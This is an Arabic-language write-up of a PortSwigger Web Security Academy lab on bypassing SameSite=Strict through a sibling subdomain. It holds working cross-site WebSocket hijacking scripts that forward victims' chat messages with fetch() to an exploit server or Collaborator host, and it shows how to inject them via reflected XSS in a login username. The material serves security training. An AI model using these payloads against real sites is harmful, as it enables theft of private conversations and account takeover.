# Lab : SameSite Strict bypass via sibling domain

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

- الفكره من الLab ده ان الموقع مش بيبعت الcsrf token مع الrequestes فا م هنعرف نستغلها بس في live chat في ثغره cross-site Webhijacking  فا المفروض استغلها واطلع المحادثات المخفيه واطلع المعلومات بتاع المستخدم علشان اتحكم فيه

```bash
1. wss://0aca004304808b8d82a9ba070055006c.web-security-academy.net/chat => 

2. https://cms-0aca004304808b8d82a9ba070055006c.web-security-academy.net

3. <script>
let newWebSocket = new WebSocket("wss://0aa10033043c82cc8047032200c500f4.web-security-academy.net/chat");
newWebSocket.onopen = function (evt) {
        newWebSocket.send("READY");
        }
newWebSocket.onmessage = function (evt) {
var message = evt.data;
fetch("https://exploit-0a6c0081046133318063020601ae004e.exploit-server.net/exploit?data" + message);
}
</script> ==> Collaboratorمن غير ال

4. <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

5. <script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

الفكرة هنا **مش** إن الموقع مش بيبعت الـ CSRF token. الفكرة هي:

- الموقع الأساسي بيحمي الـ endpoint بتاع تغيير الإيميل بكوكي `SameSite=Strict`، يعني أي طلب جاي من دومين تاني (cross-site) الكوكي مش هتترفق معاه، فالـ CSRF عادي مش هيشتغل.
- لكن فيه فيتشر "Live chat" شغال على **subdomain شقيق** لنفس الموقع (زي `cms-LAB-ID.web-security-academy.net`)، وده يعتبر "same-site" مع الموقع الأساسي (نفس الـ registrable domain)، فالكوكي بـ`SameSite=Strict` **بتتبعت طبيعي** لما الطلب يجي من الـ subdomain ده.
- الـ subdomain ده فيه **reflected XSS** في اسم المستخدم (اللي بيتعرض في رسالة "invalid username" في الشات).
- الاستغلال: تعمل صفحة عندك تعمل redirect للـ chat subdomain مع payload XSS في اسم المستخدم، الـ XSS ده لما يتنفذ جوه الـ subdomain، هيبعت طلب CSRF (fetch/XHR) لتغيير إيميل الضحية على الموقع الأساسي، والكوكي هتترفق لأنه "same-site". بعدها تعمل password reset على الإيميل الجديد وتستولي على الحساب
